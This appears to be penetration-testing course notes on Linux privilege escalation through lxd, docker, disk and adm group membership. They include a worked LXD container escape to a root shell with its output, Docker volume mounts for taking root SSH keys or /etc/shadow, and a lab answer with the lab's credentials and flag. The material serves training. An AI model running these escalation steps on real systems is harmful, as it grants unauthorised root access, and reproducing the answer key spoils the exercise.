# Privileged Groups
## LXC / LXD
LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. 

```sh
$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
# Import the local image.
$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
# Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
$ lxc init alpine r00t -c security.privileged=true

Creating r00t
# Mount the host file system.
$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
$ lxc start r00t
$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ #
```

## Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the `/root` directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

## Disk
Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. 

## ADM
Members of the adm group are able to read all logs stored in `/var/log`.

## Questions
SSH to 10.129.2.210 (ACADEMY-LPE-NIX02), with user `secaudit` and password `Academy_LLPE!`
1. Use the privileged group rights of the secaudit user to locate a flag. **Answer: ch3ck_th0se_gr0uP_m3mb3erSh1Ps!**
   - Issue the `id` command and notice that we are a member of the adm group:
        ```sh
        $ id
        uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
        ```
   - Grep recursively for the flag in the `/var/log` folder:
        ```sh
        $ grep -r "flag" /var/log*
        apache2/access.log:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps! HTTP/1.1" 301 409 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
        ```